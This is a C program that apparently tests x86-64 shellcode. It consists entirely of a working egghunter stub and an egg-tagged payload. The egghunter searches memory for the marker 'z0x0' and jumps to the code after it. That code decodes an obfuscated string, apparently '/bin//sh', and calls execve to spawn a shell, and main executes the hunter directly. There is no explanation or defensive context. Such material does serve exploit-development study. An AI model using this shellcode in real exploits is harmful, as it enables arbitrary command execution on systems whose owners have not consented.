int main(void)
{      
    char egghunter[] =
        "\x54"                          /* push   %rsp */
        "\x59"                          /* pop    %rcx */
        "\x48\x83\xc1\x18"              /* add    $0x18,%rcx */
        "\x48\xff\xc1"                  /* inc    %rcx */
        "\x81\x79\xfc\x7a\x30\x78\x30"  /* cmpl   $egg,-0x4(%rcx) */
        "\x75\xf4"                      /* jne    6 hunt */
        "\xff\xe1"                      /* jmpq   *%rcx */;
 
    char stackgarbage[] =
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 
    char eggpayload[] =
        "z0x0"                          /* egg */
        "\x31\xf6"                      /* xor    %esi,%esi */
        "\x48\xbf\xd1\x9d\x96\x91\xd0"  /* movabs $str,%rdi */
        "\x8c\x97\xff"                  /* . */
        "\x48\xf7\xdf"                  /* neg    %rdi */
        "\xf7\xe6"                      /* mul    %esi */
        "\x04\x3b"                      /* add    $0x3b,%al */
        "\x57"                          /* push   %rdi */
        "\x54"                          /* push   %rsp */
        "\x5f"                          /* pop    %rdi */
        "\x0f\x05"                      /* syscall */;
 
    (*(void(*)()) egghunter)();
 
    return 0;
}
